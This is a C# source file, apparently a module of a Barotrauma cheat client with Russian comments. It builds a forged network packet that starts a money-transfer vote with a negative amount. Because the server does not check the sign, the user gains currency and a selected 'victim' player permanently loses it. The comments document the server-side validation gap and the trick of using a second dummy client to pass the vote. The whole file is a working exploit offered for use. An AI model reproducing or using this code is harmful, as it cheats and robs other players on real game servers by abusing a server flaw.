using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  NEG TRANSFER v3 (волна 590) — ТОЛЬКО личный минус-перевод.
    //  Банка нет. Схема: ОТ МЕНЯ → жертве → −X.
    //
    //  МЕТОД: старт вотчины TransferMoney (прямой пакет минус РЕЖЕТ:
    //  ServerReadMoney `Amount <= 0 → return`, вотчина не режет —
    //  TransferVote.Finish: TryDeduct(-X) всегда true → тебе +X,
    //  жертве −X навсегда).
    //
    //  ПРОХОЖДЕНИЕ (сервер, Voting.Update): голосуют in-game ИГРОКИ
    //  КРОМЕ стартера. Нужно yes/(yes+no) >= 0.6 → минимум ОДИН
    //  «ЗА» от другого живого клиента за 30с. Молчуны не считаются.
    //  СОЛО ПРОХОДИТ В ПРИНЦИПЕ НЕ МОЖЕТ (total=0 → фейл) — это
    //  не баг модуля, это серверная математика.
    //  ТРЮК для соло-машины: второй клиент (Dummy) жмёт «ГОЛОС ЗА».
    //
    //  Пакет старта (сервер Voting.ServerRead:313):
    //    UPDATE_LOBBY → сегмент Vote → byte VoteType.TransferMoney →
    //    bool true → Int32 amount (ОТРИЦАТЕЛЬНЫЙ) → byte fromSession
    //    (мой SessionId) → byte toSession → pad.
    //  Голос «ЗА» (легально): GameMain.Client.Vote(TransferMoney, 2).
    // ============================================================
    public class NegTransferModule : CSModuleBase
    {
        public override string Id   => "neg_transfer";
        public override string Name => "Neg Transfer";
        public override string Description =>
            "Личный минус-перевод: ОТ МЕНЯ → жертве → −X.\n\n" +
            "• Выбери игрока из списка\n" +
            "• Сумма: 1К/10К/100К/1М/своя (уйдёт как −X)\n" +
            "• Запусти вотчину — увидишь счёт голосов\n" +
            "• Нужен 1 голос ЗА от другого живого игрока\n" +
            "  (второй клиент Dummy жмёт «ГОЛОС ЗА»)\n" +
            "• Соло не пройдёт никогда — так устроен сервер";

        public override string Category => "exploit";

        private static readonly Color AccentColor = new Color(255, 170, 90);
        private static readonly Color OkColor     = new Color(120, 255, 140);
        private static readonly Color DangerColor = new Color(255, 110, 110);
        private static readonly Color DimColor    = new Color(160, 170, 190);
        private static readonly Color RowColor    = new Color(30, 36, 48);
        private static readonly Color SelColor    = new Color(90, 40, 40);

        private static GUIMessageBox _window;
        private static GUIListBox _list;
        private static GUITextBlock _status;
        private static GUITextBox _amountBox;

        private static int  _amount = 10000;     // уходит жертве как −_amount
        private static Client _target;
        private static string _lastNote = "";

        public override string GetLabel()
        {
            int mine = 0;
            try { if (Character.Controlled?.Wallet != null) { mine = Character.Controlled.Wallet.Balance; } }
            catch { }
            return $"Neg Transfer −X (Me: {mine})";
        }

        public override void OnClick()
        {
            if (GameMain.Client == null)
            {
                GUI.AddMessage("[NegTr] Нет подключения", DangerColor);
                return;
            }
            if (GameMain.GameSession?.Campaign == null)
            {
                GUI.AddMessage("[NegTr] Нужна кампания", DangerColor);
                return;
            }
            if (_window != null) { CloseWindow(); return; }
            BuildWindow();
        }

        private static void BuildWindow()
        {
            try
            {
                _target = null;
                _lastNote = "";
                _window = new GUIMessageBox("Neg Transfer", "", Array.Empty<LocalizedString>(), new Vector2(0.55f, 0.8f));
                var content = _window.Content;
                content.ClearChildren();

                // ---- статус ----
                _status = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.1f), content.RectTransform),
                    "", textAlignment: Alignment.CenterLeft);
                _status.TextColor = AccentColor;
                _status.CanBeFocused = false;

                // ---- сумма ----
                var amountFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.08f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.105f) }, style: null);
                var amountLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.9f), amountFrame.RectTransform, Anchor.Center), isHorizontal: true);
                MakeAmountBtn(amountLayout, 0.13f, "1К", 1000);
                MakeAmountBtn(amountLayout, 0.13f, "10К", 10000);
                MakeAmountBtn(amountLayout, 0.13f, "100К", 100000);
                MakeAmountBtn(amountLayout, 0.13f, "1М", 1000000);
                var customFrame = new GUIFrame(new RectTransform(new Vector2(0.24f, 1f), amountLayout.RectTransform), style: null);
                _amountBox = new GUITextBox(new RectTransform(Vector2.One, customFrame.RectTransform), _amount.ToString());
                var applyBtn = new GUIButton(new RectTransform(new Vector2(0.2f, 1f), amountLayout.RectTransform), "СВОЯ");
                applyBtn.OnClicked = (b, d) => { ParseCustom(); return true; };

                // ---- список игроков ----
                var listLabel = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.05f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.19f) },
                    "Кому (клик = выбрать):", textAlignment: Alignment.CenterLeft);
                listLabel.TextColor = DimColor;
                listLabel.CanBeFocused = false;

                var listFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.44f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.24f) }, style: null);
                _list = new GUIListBox(new RectTransform(Vector2.One, listFrame.RectTransform));
                _list.Color = new Color(20, 25, 35);
                RefreshPlayers();

                // ---- кнопки ----
                var actionLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.08f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.69f) }, isHorizontal: true);
                var goBtn = new GUIButton(new RectTransform(new Vector2(0.68f, 0.95f), actionLayout.RectTransform), "★ ПЕРЕВЕСТИ −X ★");
                goBtn.Color = SelColor;
                goBtn.OnClicked = (b, d) => { LaunchMinusVote(); return true; };
                var yesBtn = new GUIButton(new RectTransform(new Vector2(0.3f, 0.95f), actionLayout.RectTransform), "ГОЛОС ЗА");
                yesBtn.Color = new Color(60, 110, 60);
                yesBtn.OnClicked = (b, d) => { VoteYes(); return true; };

                var closeLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.06f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.78f) }, isHorizontal: true);
                var closeBtn = new GUIButton(new RectTransform(new Vector2(0.2f, 0.9f), closeLayout.RectTransform), "Закрыть");
                closeBtn.OnClicked = (b, d) => { CloseWindow(); return true; };

                UpdateStatus();
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] GUI fail: " + e.Message, DangerColor);
                CloseWindow();
            }
        }

        private static void MakeAmountBtn(GUILayoutGroup layout, float relW, string text, int value)
        {
            var btn = new GUIButton(new RectTransform(new Vector2(relW, 1f), layout.RectTransform), text);
            btn.OnClicked = (b, d) =>
            {
                _amount = value;
                if (_amountBox != null) { _amountBox.Text = value.ToString(); }
                UpdateStatus();
                return true;
            };
        }

        private static void ParseCustom()
        {
            if (_amountBox == null) { return; }
            int v;
            if (int.TryParse(_amountBox.Text.Trim(), out v) && v != 0)
            {
                _amount = Math.Abs(v); // всегда положительное внутри; минус ставится при отправке
                UpdateStatus();
            }
            else
            {
                GUI.AddMessage("[NegTr] Не число", DangerColor);
            }
        }

        private static void RefreshPlayers()
        {
            if (_list == null) { return; }
            try
            {
                _list.Content.ClearChildren();

                var header = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.09f), _list.Content.RectTransform), style: null);
                header.Color = new Color(50, 60, 80);
                var headerText = new GUITextBlock(new RectTransform(Vector2.One, header.RectTransform),
                    "Игроки сервера:", textAlignment: Alignment.CenterLeft);
                headerText.TextColor = AccentColor;
                headerText.CanBeFocused = false;

                var clients = GameMain.Client?.ConnectedClients;
                if (clients == null || clients.Count == 0)
                {
                    AddNoteRow("Список пуст");
                    return;
                }

                foreach (Client c in clients)
                {
                    Client cc = c;
                    if (cc == null) { continue; }

                    string bal = "?";
                    try
                    {
                        if (cc.Character?.Wallet != null) { bal = cc.Character.Wallet.Balance.ToString(); }
                    }
                    catch { }

                    string tag = cc.Character == null ? " [не в раунде]" : "";
                    string suffix = _target == cc ? "  ◀ ЦЕЛЬ" : "";

                    var row = new GUIButton(
                        new RectTransform(new Vector2(1f, 0.09f), _list.Content.RectTransform),
                        cc.Name + tag + " — " + bal + " мк" + suffix);
                    row.Color = _target == cc ? SelColor : RowColor;
                    row.OnClicked = (b, d) =>
                    {
                        _target = cc;
                        RefreshPlayers();
                        UpdateStatus();
                        return true;
                    };
                }
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] list fail: " + e.Message, DangerColor);
            }
        }

        private static void AddNoteRow(string text)
        {
            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.09f), _list.Content.RectTransform), style: null);
            row.Color = RowColor;
            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
                textAlignment: Alignment.Center);
            txt.TextColor = DimColor;
            txt.CanBeFocused = false;
        }

        private static void UpdateStatus()
        {
            if (_status == null) { return; }
            string to = _target == null ? "не выбран" : _target.Name;
            string note = string.IsNullOrEmpty(_lastNote) ? "" : "\n" + _lastNote;
            _status.Text = "Я → " + to + " | −" + _amount + " мк" + note;
        }

        // ========================================================
        //  СТАРТ: от МЕНЯ минус жертве
        // ========================================================
        private static void LaunchMinusVote()
        {
            if (_target == null)
            {
                GUI.AddMessage("[NegTr] Выбери жертву из списка", DangerColor);
                return;
            }
            ParseCustom();

            byte fromSession = GetMySession();
            if (fromSession == 0xFF)
            {
                GUI.AddMessage("[NegTr] Себя не нашёл (войди в раунд)", DangerColor);
                return;
            }
            byte toSession = _target.SessionId;

            try
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
                {
                    segmentTable.StartNewSegment(ClientNetSegment.Vote);
                    msg.WriteByte((byte)VoteType.TransferMoney);
                    msg.WriteBoolean(true);          // startVote
                    msg.WriteInt32(-_amount);        // минус — вотчина его НЕ режет
                    msg.WriteByte(fromSession);      // от меня лично
                    msg.WriteByte(toSession);
                    msg.WritePadBits();
                }
                GameMain.Client?.ClientPeer?.Send(msg, DeliveryMethod.Reliable);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] send fail: " + e.Message, DangerColor);
                return;
            }

            _lastNote = "Вотчина −" + _amount + " запущена. Жду голоса...";
            GUI.AddMessage("[NegTr] → " + _target.Name + ": −" + _amount + " мк (голоса: счётчик ниже)", OkColor);
            GUI.AddMessage("[NegTr] 1 голос ЗА = минус спишется. Соло = фейл.", AccentColor);
            CoroutineManager.StartCoroutine(MonitorVote());
        }

        // ========================================================
        //  МОНИТОР: 35с поллим публичные счётчики голосов
        //  (GetVoteCountYes/No/Max — как в ваниль VotingInterface)
        // ========================================================
        private static IEnumerable<CoroutineStatus> MonitorVote()
        {
            double deadline = Timing.TotalTime + 35.0;
            double nextTick = 0.0;
            while (Timing.TotalTime < deadline)
            {
                if (Timing.TotalTime >= nextTick)
                {
                    nextTick = Timing.TotalTime + 1.0;
                    int yes = 0, no = 0;
                    try
                    {
                        var voting = GameMain.NetworkMember?.Voting;
                        if (voting != null)
                        {
                            yes = voting.GetVoteCountYes(VoteType.TransferMoney);
                            no = voting.GetVoteCountNo(VoteType.TransferMoney);
                        }
                    }
                    catch { }

                    if (_status != null)
                    {
                        string verdict;
                        if (yes > 0) { verdict = "★ ЕСТЬ «ЗА» — через секунды минус спишется!"; }
                        else { verdict = "жду голос ЗА от другого игрока (свой голос не считается)"; }
                        _lastNote = "Голоса: ЗА=" + yes + " ПРОТИВ=" + no + " | " + verdict;
                        UpdateStatus();
                    }

                    if (yes > 0) { break; }
                }
                yield return CoroutineStatus.Running;
            }
            if (_status != null)
            {
                _lastNote = _lastNote + "\n(если ЗА так и не было — вотчина провалилась)";
                UpdateStatus();
            }
            yield return CoroutineStatus.Success;
        }

        // ========================================================
        //  ГОЛОС ЗА: легальный ваниль-метод. Жмёт ВТОРОЙ клиент
        //  (Dummy) или сообщник. 2 = yes (сервер читает младший байт).
        // ========================================================
        private static void VoteYes()
        {
            try
            {
                GameMain.Client?.Vote(VoteType.TransferMoney, 2);
                GUI.AddMessage("[NegTr] голос ЗА отправлен", OkColor);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] vote fail: " + e.Message, DangerColor);
            }
        }

        private static byte GetMySession()
        {
            try
            {
                Character me = Character.Controlled;
                var clients = GameMain.Client?.ConnectedClients;
                if (me == null || clients == null) { return 0xFF; }
                foreach (Client c in clients)
                {
                    if (c != null && c.Character == me) { return c.SessionId; }
                }
            }
            catch { }
            return 0xFF;
        }

        private static void CloseWindow()
        {
            try { _window?.Close(); } catch { }
            _window = null;
            _list = null;
            _status = null;
            _amountBox = null;
        }

        public override void Dispose()
        {
            CloseWindow();
            base.Dispose();
        }
    }
}
